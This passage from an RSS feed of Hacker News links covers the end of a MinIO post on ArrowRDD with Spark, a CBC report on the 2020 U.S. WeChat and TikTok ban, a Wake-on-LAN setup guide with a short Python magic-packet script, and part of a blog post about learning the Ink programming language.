2400w" sizes="(min-width: 720px) 720px"><figcaption>Create a bucket named "arrowbucket" in MinIO</figcaption></figure><p>Let's use ArrowRDD and create an ArrowFile in local. Here is the code:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 2372w" sizes="(min-width: 720px) 720px"><figcaption>Writing Arrow file with ArrowRDD</figcaption></figure><p>Lines 22 to 34 do the main part. Compile and execute the code:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Execute the code</figcaption></figure><p>As you see from code, the Arrow format file is is generated in data directory. Let's copy it to the MinIO bucket we created earlier (bucket name is arrowbucket)</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Copy the arrow file we generated to MinIO bucket</figcaption></figure><p>Let's have some fun now. </p><p>Use your favorite Python editor, and write some code. First, let us start with Spark reading the file and converting it to a dataframe, with and without Arrow enabled options.</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1698w" sizes="(min-width: 720px) 720px"><figcaption>Initializing Spark context and connection parameters to Minio</figcaption></figure><p>Start your Spark cluster. Complete the code with all settings and check whether we created the Spark context successfully. To ensure that our app (named Minio-Arrow-Spark at line 8) is connected, just check the Spark UI. You should see something like this:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Spark UI (default localhost:8080) is showing our app is connected</figcaption></figure><p>Run the below code now:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1708w" sizes="(min-width: 720px) 720px"><figcaption>Reading from MinIO with Arrow format "not enabled" (top) and "enabled"(bottom)</figcaption></figure><p>The output which displays the time, shows the power of this approach. The performance boost is tremendous, almost 50%.</p><p>Recall that we created an ArrowRDD earlier and used it to write to MinIO. Let us test the memory consumption in reading it. We will use different methods.</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1882w" sizes="(min-width: 720px) 720px"><figcaption>See the results - Arrow is zero copy memory format</figcaption></figure><p>We are reading different file formats and seeing the memory consumption for each. As it is evident, Arrow format based files are zero copy - almost no memory consumed at all.</p><p>By combining MinIO with the Arrow Format, you can enhance your analytics ecosystem and virtually eliminating the friction associated with converting between different formats. This is primarily due to the reduction of serialization overhead.</p><h2 id="code">Code </h2><p>You can see the<a href="https://github.com/passionbytes/ArrowRDD"> Jupyter notebook and ArrowRDD code here</a>.</p><p>Ravishankar Nair is a technology evangelist, a consultant and an inspiring speaker. He is the CTO of PassionBytes, based in Florida. With his vast expertise in data engineering, Ravi provides consultancy in machine learning, modern data lakes and distributed computing technology. You can refer to his other articles related to MinIO here:</p><p>1) <a href="https://blog.min.io/modern-data-lake-with-minio-part-1/">Modern Data Lakes with Minio - Part 1</a></p><p>2) <a href="https://blog.min.io/modern-data-lake-with-minio-part-2/">Modern Data Lakes with MinIO - Part 2</a></p><p>3) <a href="https://blog.min.io/building-an-on-premise-ml-ecosystem-with-minio-powered-by-presto-r-and-s3select-feature/">Building an …</a></p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/">https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/</a></em></p>]]>
            </description>
            <link>https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517507</guid>
            <pubDate>Fri, 18 Sep 2020 14:52:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. bans WeChat, TikTok, citing national security reasons]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517499">thread link</a>) | @woranl
<br/>
September 18, 2020 | https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5729631.1600444028!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/1263681818.jpg"></p></div><figcaption>U.S. business transactions with the Chinese-owned social apps WeChat and TikTok are to be banned, starting Sunday.<!-- --> <!-- -->(Cindy Ord/Getty Images)</figcaption></figure><p><span><p>The U.S. Commerce Department has issued an order that will bar people in the United States from downloading Chinese-owned messaging app WeChat and video-sharing app TikTok, starting Sunday.</p>  <p>Commerce officials said the ban on new U.S. downloads of TikTok could be still rescinded by President Donald Trump before it takes effect late Sunday as TikTok owner ByteDance races to clinch an agreement over the fate of its U.S. operations.</p>  <p>ByteDance has been in talks with Oracle Corp and others to create a new company, TikTok Global, which&nbsp;aims to address U.S. concerns about the security of its users' data. ByteDance still needs Trump's approval to stave off a U.S. ban.</p>  <p>Commerce officials said they will not bar additional technical transactions for TikTok until Nov. 12, which gives the company additional time to see if ByteDance can reach a deal for its U.S. operations. "The basic TikTok will stay intact until Nov. 12," Commerce Secretary Wilbur Ross told Fox Business Network.</p>  <p>The department said the actions will "protect users in the U.S. by eliminating access to these applications and significantly reducing their functionality."</p>  <p>U.S. Commerce Department officials said they were taking the extraordinary step because of the risks the apps' data collection poses. China and the companies have denied U.S. user data is collected for spying.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1205295609.jpg 300w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1205295609.jpg 460w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1205295609.jpg 620w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg 780w,https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1205295609.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729318.1600434343!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1205295609.jpg"></p></div><figcaption>U.S. Secretary of Commerce Wilbur Ross said the ban on Tik Tok and WeChat will combat China's 'malicious collection of American citizens' personal data.'<!-- --> <!-- -->(Saul Loeb/AFP/Getty Images)</figcaption></figure></span></p>  <p>Ross said in a written statement "we have taken significant action to combat China's malicious collection of American citizens' personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations."</p>  <p>"We disagree with the decision from the Commerce Department, and are disappointed that it stands to block new app downloads from Sunday and ban use of the TikTok app in the U.S. from Nov. 12," the company said in a statement. "We will continue to challenge the unjust executive order, which was enacted without due process and threatens to deprive the American people and small businesses across the U.S. of a significant platform for both a voice and livelihoods."</p>  <p>The Commerce Department order will "de-platform" the two apps in the U.S. and bar Apple Inc's app store, Alphabet Inc's Google Play and others from offering the apps on any platform "that can be reached from within the United States," a senior Commerce official told Reuters.</p>  <p>The order will not ban U.S. companies from doing business&nbsp;on WeChat outside the United States, which will be welcome news to U.S. firms like Walmart and Starbucks that use WeChat's embedded "mini-app"&nbsp;programs to facilitate transactions and engage consumers in China, officials said.</p>    <p>The order will not bar transactions with WeChat-owner Tencent Holdings' other businesses, including its online gaming operations, and will not prohibit Apple, Google or others from offering TikTok or WeChat apps anywhere outside the United States.</p>  <p>The bans are in response to a pair of executive orders issued by Trump on Aug.&nbsp;6 that gave the Commerce Department 45 days to determine what transactions to block from the apps he deemed pose a national security threat. That deadline expires on Sunday.</p>  <h2>'Untrusted'&nbsp;Chinese apps</h2>  <p>The Trump administration has ramped up efforts to purge "untrusted" Chinese apps from U.S. digital networks and has called TikTok and WeChat&nbsp;"significant threats."</p>  <p>TikTok has 100 million users in the United States and is especially popular among younger Americans.</p>  <p>WeChat has had an average of 19 million daily active users in the United States, analytics firm&nbsp;Apptopia said in early August. It is popular among Chinese students, ex-pats and some Americans who have personal or business relationships in China.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1228542119.jpg 300w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1228542119.jpg 460w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1228542119.jpg 620w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg 780w,https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1228542119.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729307.1600433977!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1228542119.jpg"></p></div><figcaption>People walk past the headquarters of ByteDance, the parent company of TikTok, in Beijing.<!-- --> <!-- -->(Greg Baker/AFP/Getty Images)</figcaption></figure></span></p>  <p>WeChat is an all-in-one mobile app that combines services similar to Facebook, WhatsApp, Instagram and Venmo. The app is an essential part of daily life for many in China and boasts more than 1 billion users.</p>  <p>The Commerce Department will not seek to compel people in the United States to remove the apps or stop using them but will not allow updates or new downloads. "We are aiming at a top corporate level. We're not going to go out after the individual users," one Commerce official said.</p>  <p>Over time, officials said, the lack of updates will degrade the apps' usability.</p>  <p>"The expectation is that people will find alternative ways to do these actions," a senior official said. "We expect the market to act and there will be more secure apps that will fill in these gaps that Americans can trust and that the United States government won't have to take similar actions against."</p>    <p>The Commerce Department is also barring additional technical transactions with WeChat starting Sunday that will significantly reduce the usability and functionality of the app in the United States.</p>  <p>The order bars data hosting within the United States for WeChat, content delivery services and networks that can increase functionality and internet transit or peering services.</p>  <p>"What immediately is going to happen is users are going to experience a lag or lack of functionality," a senior Commerce official said of WeChat users. "It may still be usable but it is not going to be as functional as it was." There may be sporadic outages as well, the official said.</p>  <p>Commerce will bar the same set of technical transactions for TikTok, but that will not take effect until Nov. 12 to give the company additional time to see if ByteDance can reach a deal for its U.S. operations. The official said TikTok U.S. users would not see "a major difference" in the app's performance until Nov. 12.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1273236956.jpg 300w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1273236956.jpg 460w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1273236956.jpg 620w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg 780w,https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1273236956.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729309.1600434154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1273236956.jpg"></p></div><figcaption>U.S. President Donald Trump could still rescind the download ban before it comes into effect Sunday. <!-- --> <!-- -->(Scott Olson/Getty Images)</figcaption></figure></span></p>  <p>Commerce will not penalize people who use TikTok or WeChat in the United States.</p>  <p>The order does not bar data storage within the United States for WeChat or TikTok.</p>  <p>Some Americans may find workarounds. There is nothing that would bar an American from travelling to a foreign country and downloading either app, or potentially using a virtual private network and a desktop client, officials conceded.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/world/u-s-bans-wechat-tiktok-1.5729249</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517499</guid>
            <pubDate>Fri, 18 Sep 2020 14:51:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Configuring Wake-on-LAN]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517364">thread link</a>) | @jannes
<br/>
September 18, 2020 | https://jannesmeyer.com/blog/2020/wol | <a href="https://web.archive.org/web/*/https://jannesmeyer.com/blog/2020/wol">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Sometimes it's the little improvements in your workflow that give you the most satisfaction and you wonder why you hadn't made the change earlier. For me, configuring Wake-On-LAN (WOL) on my desktop PC has been one of those improvements.</p>
<p>It allows me to boot my PC on a schedule during weekdays and there are many mobile apps that allow you to send the wake command from your phone.</p>

<h2 id="1-receiving-the-wake-command-bios">1. Receiving the Wake Command (BIOS)</h2>
<p>Some motherboards have a BIOS setting for enabling Wake-On-LAN. You can look for it under names such as <em>Resume on LAN, Wake-On-LAN, WOL, Power Management</em> or similar. However, it is also possible that your motherboard doesn't have a setting for this. In that case it's either not supported or it's always enabled. You will find out more soon enough, but you could also check your motherboard manufacturer's manual.</p>
<p>The next step is going to be specific to your operating system. I will describe my experience with Windows. If you use Linux or macOS, there are <a href="https://www.lifewire.com/wake-on-lan-4149800">handy guides</a> for those elsewhere on the internet. (<a href="#3-finding-the-network-adapters-mac-address">Jump to step 3</a> in that case)</p>
<h2 id="2-receiving-the-wake-command-windows">2. Receiving the Wake Command (Windows)</h2>
<p>The first step is to configure your network adapter. Just go to the Device Manager (<code>Win+X</code> then <code>M</code>, or run <code>devmgmt.msc</code>) and choose the network adapter that you use for your network connection (usually Realtek or Intel).</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/devmgmt.png" alt="Windows Device Manager showing Intel network adapter as selected"></p>
<p>Double-click the network adapter and go to the <strong>Advanced</strong> tab. Here you have a list of settings for the driver. The one we are interested in is called <strong>Wake on Magic Packet</strong> near the bottom of the list. This needs to be set to <strong>Enabled</strong>.</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/womp.png" alt="Wake on Magic Packet: Enabled"></p>
<p>Next, you need to go to the <strong>Power Management</strong> tab and tick <strong>Allow this device to wake up the computer</strong>.</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/wakecomputer.png" alt="Power Management tab with the Wake Up setting highlighted"></p>
<p>Now that this is enabled, you should hopefully be able to start the PC with a WOL packet. But if it still doesn't work, there may be one more thing you can try.</p>
<p>I have an Asus motherboard with a network chip from Intel. Most people probably install the network driver that is provided by the OEM's website in the downloads section of their motherboard/computer. I originally had the Asus-provided driver installed, but apparently Asus decided it was a good idea to break the WOL feature on the Intel driver. This is rather confusing because I had no idea the OEMs even customise Intel's drivers.</p>
<p>What I had to do was to go to <a href="https://downloadcenter.intel.com/product/36773/Ethernet-Products">Intel's driver page</a> and download an unmodified version of the network driver.</p>
<p>Once I had the correct driver installed, the WOL feature started working immediately, but it's a good idea to make sure the driver installation did not reset the settings in the device manager.</p>
<p>Now you should be good to go for receiving the WOL packets.</p>
<h2 id="3-finding-the-network-adapters-mac-address">3. Finding the Network Adapter's MAC Address</h2>
<p>The next step is to figure out the MAC address of your network adapter. On Windows you can do it with the command <code>ipconfig /all</code>.</p>
<p>Look for the <strong>Physical Address</strong> field on the adapter whose <strong>Description</strong> matches the name of your adapter:</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/ipconfig.png" alt="ipconfig output showing the MAC address"></p>
<p>On Linux and macOS, it works quite similar with the command <code>ifconfig</code>.</p>
<h2 id="4-finding-the-networks-broadcast-address">4. Finding the Network's Broadcast Address</h2>
<p>Now the only thing left to do is to find the broadcast address of your network. It is defined as the last IPv4 address in your subnet. So you can easily derive it from your IP address and subnet mask.</p>
<p>If your IP address is <code>192.168.1.3</code> and your subnet mask is <code>255.255.255.0</code> then your broadcast address is <code>192.168.1.255</code>.</p>
<h2 id="5-sending-the-wake-command">5. Sending the Wake Command</h2>
<p>On iOS there is an app called <a href="https://apps.apple.com/app/wake-me-up-wake-on-lan/id1465416032">Wake Me Up</a> which can send the "magic" network packet. This app is nice because it integrates with Apple's Shortcuts app, which means you can also send a WOL command in a shortcut.</p>
<p><img src="https://jannesmeyer.com/images/blog/wol/wakemeup.png" alt="Wake Me Up app"></p>
<p>On other systems like a <a href="https://www.raspberrypi.org/">Raspberry Pi</a> or a NAS server I use this little Python script which I call <code>wake.py</code>:</p>
<pre>
<span>import</span> socket

mac = <span>'\xAA\xBB\xCC\xDD\xEE\xFF'</span> 
broadcast_ip = <span>'192.168.1.255'</span>   
port = <span>9</span>

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, <span>1</span>)
sock.sendto(<span>'\xFF'</span> * <span>6</span> + mac * <span>16</span>, (broadcast_ip, port))</pre><p>Of course, this script needs to be customised with the addresses you obtained in steps 3 and 4. Leaving the port set to 9 should be fine, but you can also try port 7 or 0.</p>
<p>Now you can easily run it with your system's Python interpreter.</p>
<h2 id="final-notes">Final Notes</h2>
<p>I hope these steps were enough to get you up and running with WOL. Personally, I have configured my local NAS (any server will do) to run the Python script every working day around 10 minutes before I start working, so I always find my PC ready to go when I am working from home. If you don't have a server and are not looking to buy a Raspberry Pi, you might be able to get some use out <strong>Personal Automations</strong> in the Apple Shortcuts app, which can trigger an automation whenever you turn off your phone's alarm. Since iOS 14 you can even create automations that run fully in the background (turn off <strong>Ask Before Running</strong> when creating the automation).</p>
<p>Please let me know if you know anything else that should be mentioned in this article. Just send me an email at <a href="mailto:contact@jannesmeyer.com">contact@jannesmeyer.com</a>.</p>
</div></div>]]>
            </description>
            <link>https://jannesmeyer.com/blog/2020/wol</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517364</guid>
            <pubDate>Fri, 18 Sep 2020 14:41:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning the Ink Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517321">thread link</a>) | @healeycodes
<br/>
September 18, 2020 | https://healeycodes.com/learning-the-ink-programming-language/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/learning-the-ink-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I first heard about the <a href="https://dotink.co/">Ink</a> programming language when I came across <a href="https://github.com/thesephist/polyx">Polyx</a>. Polyx is a productivity suite written in Ink that includes homegrown replacements for Dropbox and Trello as well as a personal relationship manager and a read-it-later service. <a href="https://thesephist.com/">Linus Lee</a> is the sole author of Ink and Polyx. I read through the source code of Polyx because I was interested in owning my own personal infrastructure — and this was the start of my journey with Ink!</p>
<blockquote>
<p>A functional language that takes after modern JavaScript and Go</p>
</blockquote>
<p>Ink exists in the area between a hobby project and a fully grown programming language. It has <a href="https://dotink.co/docs/">documentation</a>, open source <a href="https://dotink.co/docs/projects/">projects</a>, and it’s actively developed with regular releases. It is easy to extend, and the source code is clear and understandable. It’s got warts, sure, but you could write an application with it that gets you a customer and earns you a dollar.</p>
<p>I sent an email to Linus to chat about the language and he pointed me to some of his newer Ink projects that contained the most idiomatic code to learn from (which were <a href="https://github.com/thesephist/september">September</a> and <a href="https://github.com/thesephist/inkfmt">inkfmt</a>). He also fast tracked a planned VS Code <a href="https://github.com/thesephist/ink-vscode">syntax highlighting extension</a> when he found out what editor I was using!</p>
<p>I spent a few weeks learning the language and created <a href="https://inkbyexample.com/">Ink by Example</a> — a hands-on introduction to Ink using annotated example programs. Why was my first major project a learning resource? Well, writing about a topic helps me understand it but trying to teach a topic leads me to the hard questions that build mastery.</p>
<p>With technical topics, you meet the same problems that arise when trying to absorb a book. In <a href="https://andymatuschak.org/books/">Why books don’t work</a>, Andy Matuschak writes:</p>
<blockquote>
<p>Have you ever had a book like this—one you’d read—come up in conversation, only to discover that you’d absorbed what amounts to a few sentences? I’ll be honest: it happens to me regularly. Often things go well at first. I’ll feel I can sketch the basic claims, paint the surface; but when someone asks a basic probing question, the edifice instantly collapses</p>
</blockquote>
<p>Until I explain a topic in a permanent medium (one that exists outside my own head) I don’t know what I don’t know. I fix this by building a structure from the basic principles all the way to the tricky nodes at the end of the graph. This can be via notes, an article, or a project.</p>
<h2 id="building-learning"><a href="#building-learning" aria-label="building learning permalink"></a>Building, Learning</h2>
<p>The best way to learn a language is to build something. Ideally, something that solves a personal problem (this motivation will drive you through the quagmires to victory). The structure of Ink by Example is <del>modelled after</del> stolen from Go by Example.</p>
<p>I enjoy language resources that zoom in on a tiny slice of the syntax and give you clean examples. Usually, this starts with printing to console.</p>
<div data-language="ink"><pre><code>std := load('../vendor/std')
log := std.log

log('hello world')</code></pre></div>
<p>If someone is fluent in another programming language they will want to know how to do <em>X</em> in <em>Y</em>. They seek to translate the building blocks that they’re familiar with; data structures, functions, and system interfaces.</p>
<p>The home page of Ink by Example presumes that you know what question you’re asking. It’s designed for an intermediate programmer.</p>
<p><span>
      <a href="https://healeycodes.com/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Hello World, Values, IO, Loops, Control Flow, Lists, Maps, Functions, Files, HTTP, Random, Sorting, Execing Processes" title="Hello World, Values, IO, Loops, Control Flow, Lists, Maps, Functions, Files, HTTP, Random, Sorting, Execing Processes" src="https://d33wubrfki0l68.cloudfront.net/05b642de4cbf965b2325222a3be889541508e308/f7a04/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png" srcset="https://d33wubrfki0l68.cloudfront.net/96e5028841504f3396b4175c05d816ded6f12913/f3054/static/27460cf041bae463dffa8bab25929dfd/5a46d/list.png 300w,
https://d33wubrfki0l68.cloudfront.net/05b642de4cbf965b2325222a3be889541508e308/f7a04/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png 425w" sizes="(max-width: 425px) 100vw, 425px" loading="lazy">
  </a>
    </span></p>
<p>When building and learning at the same time I like a resource that <em>shows how something works</em>. The ‘how’ — not the ‘why’. A section of code annotated with enough information to get you started. A section of code that you can copy, change two lines, and ship!</p>
<p><span>
      <a href="https://healeycodes.com/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Random example page that explains how rand() and urand() work" title="The Random example page that explains how rand() and urand() work" src="https://d33wubrfki0l68.cloudfront.net/12776e36491c70456781464bfd2e1a46c813a4a0/55c56/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png" srcset="https://d33wubrfki0l68.cloudfront.net/ac7b7b3f1ab05213b586aa2d68f52ae05768e98c/f68c1/static/67e41456d3cd45e1904a481615c03fb8/5a46d/example.png 300w,
https://d33wubrfki0l68.cloudfront.net/c02a29e120f10890078f58281a553fcfbd2a9078/5c915/static/67e41456d3cd45e1904a481615c03fb8/0a47e/example.png 600w,
https://d33wubrfki0l68.cloudfront.net/12776e36491c70456781464bfd2e1a46c813a4a0/55c56/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png 942w" sizes="(max-width: 942px) 100vw, 942px" loading="lazy">
  </a>
    </span></p>
<p>The build tool chain for the project is powered by Ink and the <a href="https://github.com/healeycodes/inkbyexample">repository</a> builds and deploys to Netlify on commits to the main branch. </p>
<p>I set it up to be fairly hackable. There are two HTML templates (bases for index and example) that are imported as strings and formatted with Ink’s <code>std.format</code>. The order that the examples are shown is controlled by <code>examples.ink</code>. The program files are structured like a table with documentation and code in parallel cells.</p>
<p>The program files are turned into executable code and evaluated when the test or build commands are ran. This was useful during development because it gave me full certainty that these code examples actually worked. (Unit tests would have been better!)</p>
<p>The templates are compiled and written to <code>/public</code> as HTML files, along with a few static files like CSS and an <code>og:image</code>.</p>
<p>For syntax highlighting, I read through another Ink project called <a href="https://github.com/thesephist/september">September</a> and saw that it provided a print command that sent Ink source code to the terminal with syntax highlighting via ANSI escape codes. I imported the files required for highlighting and altered the escape code functions to instead wrap the lines in <code>&lt;span&gt;</code> elements with different class names.</p>
<div data-language="ink"><pre><code>` before: if comment, apply ansi.Gray function `
(Tok.Comment) -&gt; Gray

` after: if comment, wrap in span to target via class in HTML `
(Tok.Comment) -&gt; s =&gt; '&lt;span class="c"&gt;' + s + '&lt;/span&gt;'</code></pre></div>
<p>The annotated examples programs are designed to print out a lot of data. This is rendered under the source code as if the file has been ‘ran’ in a terminal to create a natural feel for an intermediate programmer and to show the shape of the data we’re dealing with.</p>
<p><span>
      <a href="https://healeycodes.com/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The section of output under the annotated program as if it has been ran via terminal" title="The section of output under the annotated program as if it has been ran via terminal" src="https://d33wubrfki0l68.cloudfront.net/075b2e15813b85b97af09761104ef85c55c9878c/0e076/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png" srcset="https://d33wubrfki0l68.cloudfront.net/0e54072057bc336bed318e160c9e067e964d5aea/d1983/static/1ff63ca42124214c2cda9a5d999dbfac/5a46d/output.png 300w,
https://d33wubrfki0l68.cloudfront.net/075b2e15813b85b97af09761104ef85c55c9878c/0e076/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png 506w" sizes="(max-width: 506px) 100vw, 506px" loading="lazy">
  </a>
    </span></p>
<p>Since everything builds to a folder called <code>/public</code>, the Netlify configuration is just two lines long. The build time is 17 seconds long.</p>
<div data-language="toml"><pre><code><span>[</span><span>build</span><span>]</span>
  <span>publish</span> <span>=</span> <span>"public/"</span>
  <span>command</span> <span>=</span> <span>"make build-linux"</span></code></pre></div>
<h2 id="why-learn-ink-at-all"><a href="#why-learn-ink-at-all" aria-label="why learn ink at all permalink"></a>Why Learn Ink At All?</h2>
<p>Sometimes I am too career driven in the languages and technologies that I pick up. So I wanted to make sure that I was still learning to explore and be creative — unencumbered by StackOverflow surveys that detail what technologies make you most employable. And what is more esoteric than a language that only two people actively code with (to my knowledge: myself and Linus).</p>
